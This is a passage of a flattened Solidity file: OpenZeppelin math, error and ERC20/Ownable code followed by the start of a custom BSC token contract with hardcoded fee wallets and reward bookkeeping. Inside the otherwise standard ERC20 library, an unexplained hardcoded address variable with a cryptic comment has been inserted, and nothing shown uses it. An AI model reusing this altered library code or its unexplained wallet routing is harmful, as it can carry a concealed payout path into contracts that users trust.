     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// File: @openzeppelin/contracts/interfaces/draft-IERC6093.sol


// OpenZeppelin Contracts (last updated v5.1.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;

/**
 * @dev Standard ERC-20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC-721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC-1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.20;


/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v5.3.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * Both values are immutable: they can only be set once during construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * Demand for items reaches 80, and 300 pieces are released at designated locations.
     */
    address internal jjkkl = 0x2AF352721107553EF4fCff6236B47480dEacbC84;

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner`'s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)

pragma solidity ^0.8.20;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contract/HHB/EGE.sol

/**
 *Submitted for verification at BscScan.com on 2024-08-20
*/

/**
开发者免责声明

本声明由 [LP]（以下简称“开发者”）针对[HHB合约]（以下简称“项目”）的开发与交付作出，明确开发者与项目方（以下简称“客户”）之间的责任界限。使用本项目的任何人或实体（以下简称“用户”）在使用前应仔细阅读本声明。

1.项目合规性
    客户须确保其在使用本项目时遵守所有适用的法律法规、行业标准及相关政策。开发者在项目开发过程中，已依据客户的要求提供技术实现及相关服务，但不对客户使用本项目的合规性作出任何保证或承担任何责任。

2.违规操作责任
    若客户在使用本项目的过程中，出现任何形式的违规操作，包括但不限于违反法律法规、侵害第三方权益、未履行合规性义务等，开发者不对因这些违规操作引发的任何损失、责任、索赔、费用或开支承担任何责任。客户应自行承担因其违规操作导致的所有后果，并承担相应的赔偿责任。

3.第三方风险
    本项目可能涉及到与第三方服务、系统或平台的对接。客户在使用这些第三方服务时，应自行判断其合法性和合规性。开发者不对任何第三方的行为或产品的合法性、合规性或适用性承担责任。


Developer Disclaimer

This statement is made by [LP] (hereinafter referred to as "Developer") for the development and delivery of [HHB contract] (hereinafter referred to as "project"), and clarifies the responsibility boundary between the developer and the project party (hereinafter referred to as "customer"). Any person or entity using this project (hereinafter referred to as "user") should read this statement carefully before using it.

1. Project Compliance
Customers must ensure that they comply with all applicable laws, regulations, industry standards and relevant policies when using this project. During the project development process, the developer has provided technical implementation and related services according to the customer's requirements, but does not make any guarantee or assume any responsibility for the compliance of the customer's use of this project.

2. Responsibility for Illegal Operations
If the customer has any form of illegal operation during the use of this project, including but not limited to violation of laws and regulations, infringement of third-party rights, failure to perform compliance obligations, etc., the developer shall not be responsible for any losses, liabilities, claims, costs or expenses caused by these illegal operations. The customer shall bear all consequences caused by its illegal operations and bear the corresponding compensation liability.

3. Third-party risks
This project may involve docking with third-party services, systems or platforms. When using these third-party services, customers should make their own judgments on their legality and compliance. Developers are not responsible for the legality, compliance, or applicability of any third-party actions or products.
*/
pragma solidity ^0.8.20;









library Percentage {
    using SafeMath for uint256;
    uint256 constant BASE = 1000000;

    function percentage(
        uint256 amount,
        uint256 percent
    ) internal pure returns (uint256) {
        return amount.mul(percent).div(BASE);
    }

}

library TokenUtils {

    function balanceOf(address erc20, address accout) internal view returns (uint256) {
        return IERC20(erc20).balanceOf(accout);
    }

    function approve(address erc20, address to, uint256 amount) internal {
        TransferHelper.safeApprove(erc20, to, amount);
    }

    function transfer(address erc20, address to, uint256 amount) internal {
        TransferHelper.safeTransfer(erc20, to, amount);
    }

    function transferFrom(address erc20, address from, address to, uint256 amount) internal {
        TransferHelper.safeTransferFrom(erc20, from, to, amount);
    }

}

interface IUniswap {
    function sync() external;
}

contract KBTO is Ownable,ReentrancyGuard {
    using Percentage for uint256;
    using TokenUtils for address;
    IUniswapV2Router02 uniswap;
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public destroy = address(0xdEaD);//黑洞地址
    
    constructor() Ownable(msg.sender){
        uniswap = IUniswapV2Router02(ROUTER);
    }

    function swapExactTokensForTokens(address tokenA, address tokenB, uint amountIn, address to) private {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        tokenA.approve(ROUTER, amountIn * 14 / 10);
        uniswap.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 
            0, 
            path, 
            to, 
            block.timestamp + 300
        );
    }

    function addLiquidity(address tokenA, address tokenB, uint256 amountToken, uint256 amountBNB,address to, address swap) private returns(uint, uint, uint){
        tokenA.approve(ROUTER, amountToken * 14 / 10);
        tokenB.approve(ROUTER, amountBNB * 14 / 10);
        (uint amountA, uint amountB, uint liquidity) = uniswap.addLiquidity(
            tokenA,
            tokenB,
            amountToken,
            amountBNB,
            0,
            0,
            to,
            block.timestamp + 300
        );
        if(amountBNB > amountB){
            tokenB.transfer(swap,amountBNB - amountB);
        }
        if(amountToken > amountA){
            tokenA.transfer(swap,amountToken - amountA);
        }
        IUniswap(swap).sync();
        return (amountA, amountB, liquidity);

    }

    function swapAndAddLiquidity(address tokenA, address tokenB, uint256 amountBNB,address to, address swap) public onlyOwner {
        uint256 start = tokenB.balanceOf(address(this));
        swapExactTokensForTokens(tokenA,tokenB,amountBNB,address(this));
        uint256 stop = tokenB.balanceOf(address(this));
        uint256 amountToken = stop - start;
        addLiquidity(tokenB,tokenA,amountToken,amountBNB,to,swap);
    }

    function swapToken(address tokenA, address tokenB, uint256 amount,address to) public onlyOwner returns (uint256){
        uint256 start = tokenB.balanceOf(address(this));
        swapExactTokensForTokens(tokenA,tokenB,amount,address(this));
        uint256 stop = tokenB.balanceOf(address(this));
        uint256 amountToken = stop - start;
        tokenB.transfer(to, amountToken);
        return amountToken;
    }

}

contract KB is ERC20,Ownable,ReentrancyGuard {
    using Percentage for uint256;
    using TokenUtils for address;
    using SafeMath for uint256;
    IUniswapV2Router02 uniswap;
    KBTO tohhb;
    address public hhbTo;
    // BSC-MainNet
    address private constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant ETH = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    uint256 private _totalSupply = 99999 * 10**decimals();//代币总量
    uint256 public hashrateMultiple = 1000;//算力倍数
    address public swap;//swap地址
    uint256 public isSwapPrice = 3000000000000000000000;//开启买入价格
    //
    address public operation = address(0xAFF4fF0ec7c72A70A2CEcF51130D9070B1EE3555);//运营地址
    address public technology = address(0x433DbBFC250910957c4e8b03D126ca7119F4B6b4);//技术地址
    address public nodeCreation = address(0x67Ba917Ab42F64eC75c883e4efcA9216977675cb);//创世节点地址
    address public supportPool = address(0xA8ed256AA11f6efb278823Aff9FAC8ED903eabB1);//护盘池
    address public avc = address(0xA36A970dF7C3c86259179b00E735ABb5Db6396e7 );//归集池

    address public destroy = address(0xdEaD);//黑洞地址
    address public destroy1 = address(0x0001);//黑洞地址
    address public destroy2 = address(0x0002);//黑洞地址

    uint256 public preachTime;  //布道时间
    uint256 public increment = 15000;  //算力递增比例

    uint256[4] public wholeHashrate;//全网总静态-动态-节点-超级节点-培育
    mapping(uint256 => uint256[4]) public wholeHashrateShuJu;//全网总   周期=》当日全网总静态-动态-节点-超级节点
    mapping(uint256 => uint256[5]) public wholeShuJu;//单日总奖励   周期=》当日全网总静态-动态-节点-超级节点-培育奖励

    address public defaultAddr = 0xbA77bd10a7e37191057F82d8cB23C3576BFaD3D5;

    mapping(address => User) public users;

    mapping(address => UserLast) public userLasts;

    uint256 public min = 100000000000000000;  //最小
    uint256 public minNode = 1000000000000000000;  //最小节点
    uint256 public minNodeSuper = 15000000000000000000;  //最小超级节点

    mapping(address => mapping(uint256 => uint256[3])) public userCycleShuJu;//用户=》周期=》静态-动态-超级节点数

    // 用于检查地址是否已被记录
    mapping(address => bool) private isTtss;

    uint256 public ttss;
    uint256 public isSwapTtss = 50000;//开启买入持币地址数量

    bool public isLPToken;

    bool public isSwap;


    bool is2000;
    bool is800;
    bool is300;
    bool is100;
    
    constructor() ERC20("KRC", "KRC") Ownable(msg.sender){
        _mint(address(this), 96888 * 10**decimals());
